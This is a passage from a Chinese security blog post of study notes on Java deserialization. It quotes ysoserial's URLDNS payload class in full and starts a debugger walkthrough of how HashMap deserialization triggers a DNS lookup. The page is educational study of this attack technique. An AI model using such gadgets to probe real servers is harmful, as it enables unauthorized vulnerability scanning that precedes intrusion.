<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。序列化是这个过程的第一部分,将数据分解成字节流,以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象">
<meta property="og:type" content="article">
<meta property="og:title" content="从JAVA安全漫谈看反序列化">
<meta property="og:url" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="f4nx1ng&#39;s blog">
<meta property="og:description" content="Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。整个过程都是 Java 虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。序列化是这个过程的第一部分,将数据分解成字节流,以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns1.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns2.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns4.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns5.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns6.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns7.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns8.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns9.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC1.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC2.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC3.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC8.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC11.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC16.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC17.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC18.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC19.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC20.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC15.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CB1.png">
<meta property="og:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CB3.png">
<meta property="article:published_time" content="2024-07-29T01:57:00.000Z">
<meta property="article:modified_time" content="2024-07-29T03:29:24.223Z">
<meta property="article:author" content="f4nx1ng">
<meta property="article:tag" content="JAVA安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns1.png">


<link rel="canonical" href="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","path":"2024/07/29/从JAVA安全漫谈看反序列化/","title":"从JAVA安全漫谈看反序列化"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>从JAVA安全漫谈看反序列化 | f4nx1ng's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">f4nx1ng's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">8</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">Java反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#urldns"><span class="nav-number">1.2.</span> <span class="nav-text">urldns</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.</span> <span class="nav-text">原理分析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cc%E9%93%BE"><span class="nav-number">1.3.</span> <span class="nav-text">CC链</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#cc1%E9%93%BE%E4%B9%8Btransformedmap"><span class="nav-number">1.3.1.</span> <span class="nav-text">CC1链之TransformedMap</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#transformedmap"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">TransformedMap</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#transformer"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">Transformer</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#constanttransformer"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">ConstantTransformer</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#invokertransformer"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">InvokerTransformer</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#chainedtransformer"><span class="nav-number">1.3.1.5.</span> <span class="nav-text">ChainedTransformer</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%90%86%E8%A7%A3demo"><span class="nav-number">1.3.1.6.</span> <span class="nav-text">理解demo</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#poc%E6%9E%84%E9%80%A0"><span class="nav-number">1.3.1.7.</span> <span class="nav-text">POC构造</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.1.8.</span> <span class="nav-text">总结：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cc1%E4%B9%8Blazymap"><span class="nav-number">1.3.2.</span> <span class="nav-text">CC1之LazyMap</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#lazymap"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">LazyMap</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#java%E5%AF%B9%E8%B1%A1%E4%BB%A3%E7%90%86"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">Java对象代理</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cc6"><span class="nav-number">1.3.3.</span> <span class="nav-text">CC6</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#tmplatesimpl%E7%9A%84%E5%8D%8A%E6%88%AA%E9%93%BE"><span class="nav-number">1.3.4.</span> <span class="nav-text">TmplatesImpl的半截链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cc3"><span class="nav-number">1.3.5.</span> <span class="nav-text">CC3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cc2"><span class="nav-number">1.3.6.</span> <span class="nav-text">CC2</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#priorityqueue%E5%88%A9%E9%93%BE"><span class="nav-number">1.3.6.1.</span> <span class="nav-text">PriorityQueue利⽤链</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">1.3.6.2.</span> <span class="nav-text">调试过程</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cb"><span class="nav-number">1.3.7.</span> <span class="nav-text">CB</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#apache-commons-beanutils"><span class="nav-number">1.3.7.1.</span> <span class="nav-text">Apache Commons Beanutils</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#java-bean"><span class="nav-number">1.3.7.2.</span> <span class="nav-text">Java Bean</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#commons-beanutils"><span class="nav-number">1.3.7.3.</span> <span class="nav-text">commons-beanutils</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#getter%E7%9A%84%E5%A6%99%E7%94%A8"><span class="nav-number">1.3.7.4.</span> <span class="nav-text">getter的妙用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0"><span class="nav-number">1.3.7.5.</span> <span class="nav-text">反序列化链的构造</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#section"><span class="nav-number">1.3.8.</span> <span class="nav-text"></span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
      src="/images/touxiang.jpg">
  <p class="site-author-name" itemprop="name">f4nx1ng</p>
  <div class="site-description" itemprop="description">A big noob</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="f4nx1ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="f4nx1ng's blog">
      <meta itemprop="description" content="A big noob">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="从JAVA安全漫谈看反序列化 | f4nx1ng's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          从JAVA安全漫谈看反序列化
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-07-29 09:57:00 / 修改时间：11:29:24" itemprop="dateCreated datePublished" datetime="2024-07-29T09:57:00+08:00">2024-07-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">反序列化</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>Java
提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。整个过程都是
Java
虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。序列化是这个过程的第一部分,将数据分解成字节流,以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示,有时还要恢复数据。本文主要记录个人在当时学习Java安全漫谈的一些学习记录。</p>
<span id="more"></span>
<h3 id="java反序列化">Java反序列化</h3>
<h4 id="前言">前言</h4>
<p>Java
提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。</p>
<p>整个过程都是 Java
虚拟机（JVM）独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。</p>
<p>序列化是这个过程的第一部分,将数据分解成字节流,以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示,有时还要恢复数据。</p>
<h4 id="urldns">urldns</h4>
<p>urldns在ysoserial当中是一个利用链的名字，但准确的来说，其并不能被称作为“利用链”。因为其参数的特殊性，该利用连的参数是一个url并不是一个能够执行的命令，起触发的结果也仅仅只是一次DNS请求</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时</span><br><span class="line">使⽤：</span><br><span class="line">使⽤Java内置的类构造，对第三⽅库没有依赖</span><br><span class="line">在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</span><br></pre></td></tr></table></figure>
<p>我们去到github上面找到ysoserial工具使用urldns利用链的源码部分，我们可以得到以下内容：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h5 id="原理分析">原理分析</h5>
<p>再导入ysoserial工程项目之后，我们可以使用外加参数形式进行调试。在ysoserial的每一个项目payload当中都有一个PayloadRunner.run</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>这个主方法可以让输入的参数进行序列化之后再进行反序列化，可以同时进行双向的调试，因为主要分析的是反序列化漏洞，所以要测试的基本上全是后半程的内容，直接下断点进行调试。</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns1.png" class>
<p>直接进入后半程的反序列化环节，看到下面的具体的调用内容，但是我们知道反序列化的触发点是readobject()。所以这些东西都可以跳过。</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns2.png" class>
<p>直接来到hashmap当中的readObject，这一部分直接来到下面的部分。</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns4.png" class>
<p>看到下面的语句是putVal(hash(key), value, false, false)</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/urldns5.png" class>
<p>进入hash()方法具体看看使用的方法，里面有一个hashcode()方法。</p>
